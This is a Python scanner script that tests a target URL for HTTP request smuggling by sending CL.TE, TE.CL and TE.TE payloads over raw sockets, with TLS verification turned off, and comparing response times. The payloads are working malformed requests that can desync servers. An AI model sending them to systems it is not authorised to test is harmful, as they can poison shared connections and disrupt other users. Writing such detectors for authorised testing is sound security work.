#!/usr/bin/env python3
"""WebRecox — smuggler.py
HTTP request smuggling detector (CL.TE / TE.CL timing-based heuristic).

Usage: python3 smuggler.py https://target.com [-t 10]
"""
import argparse, socket, ssl, time, sys
from urllib.parse import urlparse

PAYLOADS = {
    "CL.TE": b"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG",
    "TE.CL": b"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nHost: {host}\r\n\r\n0\r\n\r\n",
    "TE.TE": b"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: identity\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nHost: {host}\r\n\r\n0\r\n\r\n",
}

def probe(host, port, use_tls, name, payload, timeout):
    sock = socket.create_connection((host, port), timeout=timeout)
    if use_tls:
        ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
        sock = ctx.wrap_socket(sock, server_hostname=host)
    sock.sendall(payload.replace(b"{host}", host.encode()))
    start = time.time()
    try:
        data = b""
        while time.time() - start < timeout:
            chunk = sock.recv(4096)
            if not chunk: break
            data += chunk
            if len(data) > 8192: break
    except socket.timeout:
        pass
    elapsed = time.time() - start
    sock.close()
    return elapsed, len(data)

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("url")
    ap.add_argument("-t", "--timeout", type=float, default=8)
    args = ap.parse_args()
    u = urlparse(args.url)
    host = u.hostname; port = u.port or (443 if u.scheme=="https" else 80); use_tls = u.scheme=="https"
    print(f"[•] Target: {host}:{port}  TLS={use_tls}")
    base, _ = probe(host, port, use_tls, "baseline", b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n", args.timeout)
    print(f"[•] Baseline RTT ~ {base:.2f}s")
    for name, p in PAYLOADS.items():
        t, n = probe(host, port, use_tls, name, p, args.timeout)
        verdict = "VULN?" if t > base * 2 + 1 else "ok"
        print(f"[{verdict}] {name:6s}  {t:.2f}s  {n}B")

if __name__ == "__main__":
    main()
